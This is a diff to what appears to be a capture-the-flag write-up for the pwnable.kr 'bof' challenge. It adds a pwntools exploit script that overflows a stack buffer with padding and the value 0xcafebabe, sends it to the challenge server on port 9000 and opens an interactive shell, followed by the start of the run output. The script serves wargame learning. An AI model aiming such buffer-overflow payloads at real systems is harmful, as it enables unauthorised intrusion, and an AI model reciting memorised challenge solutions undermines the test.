@@ -24,9 +24,29 @@ int main(int argc, char* argv[]){
 }
 
 ```
+---
+exp.py
+
+```python
+from pwn import *
+
+context.binary = binary = "./bof"
+
+payload = b'a'*44
+payload += b'b'*4
+payload += b'c'*4
+payload += p32(0xcafebabe)
+
+p = process()
+p = remote('pwnable.kr', 9000)
+
+p.sendline(payload)
+p.interactive()
+```
+
 
 ---
-```
+```bash
 ❯ python3 exp.py
 [*] '/home/lynk/pwnable/bof/bof'
     Arch:     i386-32-little
